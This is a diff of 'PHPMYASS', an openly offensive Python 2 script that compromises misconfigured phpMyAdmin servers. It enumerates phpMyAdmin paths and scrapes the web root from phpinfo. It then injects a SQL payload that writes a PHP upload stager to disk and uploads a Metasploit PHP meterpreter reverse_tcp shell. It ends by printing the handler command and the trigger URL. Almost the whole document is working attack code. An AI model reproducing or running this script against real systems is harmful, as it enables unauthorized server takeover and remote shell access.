@@ -7,18 +7,17 @@
 #    _/      _/     /  _/      _/     _/   _/    _/     _/        _/       _/
 #   _/      _/    _/  _/      _/     _/   _/    _/     _/ _/_/_/_/ _/_/_/_/
 #
-# v0.53 WIP
-# PHPMYASS | A LESSON IN SERVER MISCONFIGURATION | FIZZLE STICK (Professor)
-# TESTED AGAINST: WINDOWS W/ UWAMP, XAMPP
+# v0.54 PHPMYASS | A LESSON IN SERVER MISCONFIGURATION | FIZZLE STICK (Professor)
+# TESTED AGAINST: WINDOWS W/ UWAMP, XAMPP and LINUX W/XAMPP(with writeable dirs)
 # workFLOW: discover, inject, validate, report.....
 # "what does this do?"....
 # - this is designed to leverage misconfigured phpmyadmin installations with auth=config.
 # - the process is agnostic, and can have sexy time with both windows or linux in theory.
 # - We look for the open page, find some crap we need, clean it up, and then create an PHP shell.
-# - New shell work has been added including PHP meterpreter & b347k webshell deliveries
+# - The result of the process is a meterpreter PHP session.....
 ###################################################################################################
 
-# BING IN OUR LIBS
+# BRING IN OUR LIBS
 import sys
 import os
 import urllib
@@ -26,19 +25,10 @@ import mechanize
 import logging
 from re import findall
 
-# BRING IN SCAPY, QUIET IT DOWN
-logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
-from scapy.all import *
-conf.verb=0
-
-# TOR (still experimental)
-#import socks
-#import socket
-
 # CREATE OUR BROWSER
 br = mechanize.Browser()
 
-# list taken from websploit2.0.4 
+# LIST TAKEN FROM websploit2.0.4
 mylist = [
 '/phpmyadmin/',
 '/phpMyAdmin/',
@@ -145,44 +135,32 @@ mylist2 = [
 '/webadmin/phpinfo.php',
 '/setup/phpinfo.php']
 
-# DEFINE FUNCTION PROBE
-def probe(host):
-    myprobe = (IP(dst=host)/TCP(dport=80,flags="S"))
-    try:
-        derp = sr1(myprobe, timeout=1)
-        derpy = derp.summary()
-        if derpy.find('SA') != -1:
-            print "[PORT80S:]\t\t[RESULT:] GOT SYN ACK\t\t\t\t[DECISION:] CONTINUE"
-        elif derpy.find('RA') != -1:
-            print "[PORT80S:]\t\t[RESULT:] CLOSED GOT RST/ACK\t\t[DECISION:] EXITING"
-            sys.exit()
-    except Exception, ack:
-        print '[HARDEXIT:]\tNO TCP RESPONSE (Firewall/filtered/etc)'
-        sys.exit()
-
 # DEFINE CHECKROOT FUNCTION
 def checkroot(host):
     funfun = ''
     for pmadir in mylist:
         try:
-            openmya = br.open('http://'+host+pmadir+'main.php') # MAIN was required on windows to n
-            #openmya = br.open('http://'+host+pmadir')
+            openmya = br.open('http://'+host+pmadir)
             funfun = 'yes'
             print '[PMADIRS:]\t\t[RESULT:] AWESOME! FOUND IT\t\t\t[DECISION:] CONTINUE'
             global thatdir
             thatdir = pmadir
             disc1 = openmya.read()
-            if disc1.find('root@localhost') != -1:
-                print "[OPNROOT:]\t\t[RESULT:] FOUND!!! root@localhost\t[DECISION:] CONTINUE"
+            if disc1.find('token') != -1:
+                print "[OPNROOT:]\t\t[RESULT:] FOUND!!! TOKEN string..\t[DECISION:] CONTINUE"
                 break
             else:
-                print "[OPNROOT:]\t\t[RESULT:] open ROOT not found....\t\t[DECISION:] EXITING"
-                break
+                print "[OPNROOT:]\t\t[RESULT:] did NOT find TOKEN string\t[DECISION:] EXITING"
+                print '[exit....]'
+                quit()
         except:
-            continue
+            print '[HARDEXIT:]\t\t[RESULT:] Found NO PMA dirs ;(\t\t[DECISION:] EXITING'
+            print '[exit....]'
+            quit()
     if funfun != 'yes':
         print '[HARDEXIT:]\t\t[RESULT:] Found NO PMA dirs ;(\t\t[DECISION:] EXITING'
-        sys.exit()
+        print '[exit....]'
+        quit()
 
 # DEFINE WWWFIND FUNCTION
 def wwwfind(host):
@@ -196,94 +174,89 @@ def wwwfind(host):
                 phpresp.count('DOCUMENT_ROOT')
                 somedata = findall('DOCUMENT_ROOT +[\D]+[</td><td class="v">]', phpresp)
                 nig = str(somedata)
-                #len(nig)
                 frack = nig.replace('[\'DOCUMENT_ROOT </td><td class="v">', '')
                 nerd = str.split(frack)
                 wwwdir = nerd[0]
                 print '[W3BROOT:]\t\t[RESULT:] FOUND the file root!!\t\t[DECISION:] CONTINUE'
-                #### BRING IN THE PAYLOAD
-                payload1 = 'CREATE TABLE `phpmyadmin`.`newnew` ( `track2` VARCHAR( 1000 ) NOT NULL ) ENGINE = MYISAM ; INSERT INTO newnew VALUES ("<?php echo \'<form enctype=multipart/form-data action=phpmyass911.php method=POST> <input type=hidden name=MAX_FILE_SIZE value=100000 /> <input name=uploadedfile type=file /><br /><input type=submit value=Upload File /></form>\'; move_uploaded_file($_FILES[uploadedfile][tmp_name], basename( $_FILES[uploadedfile][name]));?> ");select * into dumpfile \''+wwwdir+'/phpmyass911.php\' from newnew;'
+                payload1 = 'CREATE TABLE `mysql`.`newnew` ( `track2` VARCHAR( 1000 ) NOT NULL ) ENGINE = MYISAM ; INSERT INTO newnew VALUES ("<?php echo \'<form enctype=multipart/form-data action=mystager.php method=POST> <input type=hidden name=MAX_FILE_SIZE value=100000 /> <input name=uploadedfile type=file /><br /><input type=submit value=Upload File /></form>\'; move_uploaded_file($_FILES[uploadedfile][tmp_name], basename( $_FILES[uploadedfile][name]));?> ");select * into dumpfile \''+wwwdir+'/mystager.php\' from newnew;'
                 paywrite = open("newnew.sql", "w")
                 paywrite.write(payload1)
                 paywrite.close()
                 print '[PAYLOAD:]\t\t[RESULT:] CREATED w/payload #1\t\t[DECISION:] CONTINUE'
                 funfun2 = 'yes'
-                break #breakout
+                break
         except:
             continue
     if funfun2 != 'yes':
         print '[HARDEXIT:]\t\t[RESULT:] ..not found....\t\t\t[DECISION:] EXITING'
-        sys.exit()
+        quit()
 
 # DEFINE SHELLDROP FUNCTION
 def shelldrop(host):
     try:
-        openmya2 = br.open('http://'+host+thatdir+'db_import.php?db=phpmyadmin')
+        openmya2 = br.open('http://'+host+thatdir+'db_import.php?db=mysql')
         if openmya2.code == 200:
             print '[IMPORTS:]\t\t[RESULT:] FOUND IMPORT LINK!!\t\t[DECISION:] CONTINUE'
             importresp = openmya2.read()
             br.select_form(nr=1)
             filename = 'newnew.sql'
             br.form.add_file(open(filename), 'text/plain', filename)
-            #br.form.set_all_readonly(False)
             br.submit()
             print "[PAYLOAD:]\t\t....SENT!!!!!!!"
-            upurl = ('http://'+host+'/phpmyass911.php')
+            upurl = ('http://'+host+'/mystager.php')
             upchuck = urllib.urlopen(upurl)
             try:
                 if upchuck.code == 200:
                     print '[RESULTS:]\t\tOUR UPLOAD STAGER IS IN PLACE!!! '
                 else:
                     print '[RESULTS:]\t\tUPLOAD STAGER FAILED!!! ;( SAD FACE!!!'
+                    print '[At this point the probable outcome is we were denied the write-out of the shell]'
+                    print '[exit....]'
+                    quit()
             except:
-                pass
+                quit()
     except:
-        pass
+        quit()
 
 # DEFINE MSFPHP FUNCTION (needs stability)
 def msfphp():
-    msfhost = raw_input('[MSFPHP..:]\t\tLHOST?? >> ')
-    msfport = raw_input('[MSFPHP..:]\t\tLPORT?? >> ')
-    os.system('rm -rf phpmyass187.php') #generic pre-clean
-    os.system('msfpayload php/meterpreter/reverse_tcp lhost='+msfhost+' lport='+msfport+' R > phpmyass187.php')
-    ### msfcli multi/handler payload=php/meterpreter/reverse_tcp lhost=192.168.1.119 lport=9999 E
-    print '[MSFPHP..:]\t\tPHP METERPRETER created....'
+        try:
+            global msfhost
+            global msfport
+            msfhost = raw_input('[MSFPHP..:]\t\tLHOST?? >> ')
+            msfport = raw_input('[MSFPHP..:]\t\tLPORT?? >> ')
+            os.system('rm -rf phpmyass187.php') #generic pre-clean
+            os.system('msfpayload php/meterpreter/reverse_tcp lhost='+msfhost+' lport='+msfport+' R > myshell.php')
+            print '[MSFPHP..:]\t\tPHP METERPRETER created....'
+        except:
+            print '[exit....]'
+            quit()
 
 # DEFINE MSFDELIVER FUNCTION (needs stability)
 def msfdeliver():
-    uploadpage = br.open('http://'+host+'/phpmyass911.php')
+    uploadpage = br.open('http://'+host+'/mystager.php')
     br.select_form(nr=0)
-    br.form.add_file(open('phpmyass187.php'), 'text/plain', 'phpmyass187.php')
+    br.form.add_file(open('myshell.php'), 'text/plain', 'myshell.php')
     br.submit()
     print '[MSFPHP..:]\t\tPHP METERPRETER uploaded...'
 
-# DEFINE BEAKDELIVER FUNCTION (needs stability)
-def beakdeliver():
-    uploadpage = br.open('http://'+host+'/phpmyass911.php')
-    br.select_form(nr=0)
-    br.form.add_file(open('beak.php'), 'text/plain', 'beak.php')
-    br.submit()
-    print '[MSFPHP..:]\t\tBEAK WEB SHELL uploaded...'
-
-## THE MAGIC....
 print '==============================================================================='
-print '    _/_/_/_/_/    _/  _/_/_/  _/     _/ _/    _/ _/_/_/_/ _/_/_/_/ _/_/_/_/'
-print '   _/    _/ _/   _/  _/    _/_/_/ _/_/  _/ _/  _/     _/  _/       _/'
-print '  _/_/_/  _/_/_/_/  _/_/_/  _/  _/ _/   _/    _/_/_/ _/    _/_/     _/_/'
-print ' _/      _/    _/  _/      _/     _/   _/    _/     _/        _/       _/'
-print '_/      _/    _/  _/      _/     _/   _/    _/     _/ _/_/_/_/ _/_/_/_/ v0.53 WIP'
+print '      _/_/_/_/_/    _/  _/_/_/  _/     _/ _/    _/ _/_/_/_/ _/_/_/_/ _/_/_/_/'
+print '     _/    _/ _/   _/  _/    _/_/_/ _/_/  _/ _/  _/     _/  _/       _/'
+print '    _/_/_/  _/_/_/_/  _/_/_/  _/  _/ _/   _/    _/_/_/ _/    _/_/     _/_/'
+print '   _/      _/    _/  _/      _/     _/   _/    _/     _/        _/       _/'
+print '  _/      _/    _/  _/      _/     _/   _/    _/     _/ _/_/_/_/ _/_/_/_/ v0.54  '
+print '     An open phpMyAdmin attack script designed to leverage auth=config....'
+print '        By fizzlestick @monkeybeez -https://github.com/fizzlestick/PHPMYASS'
 print '==============================================================================='
-host = raw_input('[TARGET>>] ')
-print '[*] GOING FULL RETARD WIP MODE ;D '
-probe(host)
+host = raw_input('[TARGET IP/HOST] >> ')
 checkroot(host)
 wwwfind(host)
 shelldrop(host)
 msfphp()
 msfdeliver()
-#beakdeliver()
-print "NOW OPEN MSF copy and paste this line >> msfcli multi/handler payload=php/meterpreter/reverse_tcp lhost=192.168.1.119 lport=9999 E << "
-print 'FINAL INSTRUCTION OPEN THIS URL TO KICK THE SHELL>> http://192.168.1.122/phpmyass187.php'
+print 'NOW OPEN MSF copy and paste this line -> msfcli multi/handler payload=php/meterpreter/reverse_tcp lhost='+msfhost+' lport='+msfport+' E'
+print 'FINAL INSTRUCTION OPEN THIS URL TO KICK THE SHELL>> http://192.168.1.122/myshell.php'
 print '==============================================================================='
-exit
+sys.exit(0)
 
